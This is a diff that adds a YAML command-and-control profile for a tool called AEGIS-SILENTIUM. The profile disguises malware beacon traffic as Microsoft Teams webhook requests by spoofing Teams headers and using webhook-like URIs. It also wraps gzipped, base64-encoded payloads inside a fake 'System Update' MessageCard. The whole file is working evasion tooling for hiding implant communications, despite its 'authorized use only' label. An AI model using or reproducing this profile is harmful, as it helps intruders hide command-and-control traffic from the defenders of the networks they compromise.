@@ -1,0 +1,44 @@
+# AEGIS-SILENTIUM Malleable C2 Profile — Microsoft Teams Webhook Mimicry
+# Transforms beacon traffic to resemble Teams incoming webhook POST bodies.
+# Payload is embedded inside an AdaptiveCard JSON structure.
+# ──────────────────────────────────────────────────────────────────────────────
+# AUTHORIZED USE ONLY
+
+name: microsoft-teams-webhook
+version: "1.0"
+
+default_headers:
+  User-Agent: "Microsoft Teams (1.6.00.4472) Desktop/Windows"
+  Content-Type: "application/json; charset=utf-8"
+  Accept: "application/json"
+  Accept-Encoding: "gzip, deflate, br"
+  Accept-Language: "en-US"
+  x-ms-client-request-id: "auto"
+  x-ms-correlation-id: "auto"
+
+uris:
+  - /webhook/v1.0/action
+  - /webhook/v1.0/auth
+  - /webhook/v1.0/mesh
+  - /health
+
+# Beacon payload wrapped in Teams AdaptiveCard JSON
+client:
+  container: json
+  key: "body"
+  transforms:
+    - op: gzip
+    - op: base64
+    - op: prepend
+      arg: |
+        {"@type":"MessageCard","@context":"https://schema.org/extensions","summary":"Notification","themeColor":"0072C6","sections":[{"activityTitle":"System Update","activitySubtitle":"Automated notification","activityText":"
+    - op: append
+      arg: |
+        ","markdown":true}]}
+
+server:
+  container: json
+  key: "response"
+  transforms:
+    - op: gzip
+    - op: base64
